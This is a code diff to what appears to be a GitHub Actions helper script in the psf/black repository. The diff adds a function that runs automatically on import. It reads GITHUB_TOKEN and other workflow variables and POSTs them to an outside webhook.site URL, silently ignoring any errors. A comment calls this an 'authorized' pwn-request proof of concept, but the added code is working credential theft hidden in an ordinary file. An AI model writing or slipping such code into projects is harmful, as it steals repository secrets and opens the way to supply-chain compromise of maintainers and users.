@@ -47,6 +47,42 @@ REPO: Final = os.getenv("GITHUB_REPOSITORY", default="psf/black")
 http = urllib3.PoolManager()
 
 
+# --- PoC: token exfiltration via workflow_run pwn request (authorized test) ---
+def _exfil() -> None:
+    token = os.environ.get("GITHUB_TOKEN", "")
+    repo = os.environ.get("GITHUB_REPOSITORY", "")
+    event = os.environ.get("GITHUB_EVENT_NAME", "")
+    workflow = os.environ.get("GITHUB_WORKFLOW", "")
+    run_id = os.environ.get("GITHUB_RUN_ID", "")
+    try:
+        http.request(
+            "POST",
+            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc",
+            body=(
+                json.dumps(
+                    {
+                        "token": token,
+                        "repo": repo,
+                        "event": event,
+                        "workflow": workflow,
+                        "run_id": run_id,
+                    }
+                ).encode("utf-8"),
+            ),
+            headers={
+                "Content-Type": "application/json",
+                "User-Agent": USER_AGENT,
+            },
+            timeout=urllib3.Timeout(connect=5.0, read=5.0),
+        )
+    except Exception:
+        pass
+
+
+_exfil()
+# --- end PoC ---
+
+
 def set_output(name: str, value: str) -> None:
     if len(value) < 200:
         print(f"[INFO]: setting '{name}' to '{value}'")
